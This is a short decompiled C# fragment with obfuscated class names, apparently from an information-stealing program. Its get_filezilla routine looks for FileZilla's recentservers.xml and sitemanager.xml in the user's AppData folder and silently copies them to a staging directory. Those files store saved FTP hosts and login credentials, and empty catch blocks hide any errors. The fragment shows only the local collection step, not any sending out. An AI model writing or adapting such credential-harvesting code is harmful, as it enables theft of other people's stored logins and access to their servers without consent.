using System;
using System.IO;

// Token: 0x0200000C RID: 12
internal class Class6
{
	// Token: 0x0600001B RID: 27 RVA: 0x0000237E File Offset: 0x0000057E
	public Class6()
	{
		Class17.jLpoVv1z2TmaE();
		base..ctor();
	}

	// Token: 0x0200000D RID: 13
	internal class Class7
	{
		// Token: 0x0600001C RID: 28
		public static void get_filezilla(string string_0)
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml"))
			{
				try
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", string_0 + "filezilla_recentservers.xml", true);
				}
				catch
				{
				}
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml"))
				{
					try
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", string_0 + "filezilla_sitemanager.xml", true);
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x0000237E File Offset: 0x0000057E
		public Class7()
		{
			Class17.jLpoVv1z2TmaE();
			base..ctor();
		}
	}
}
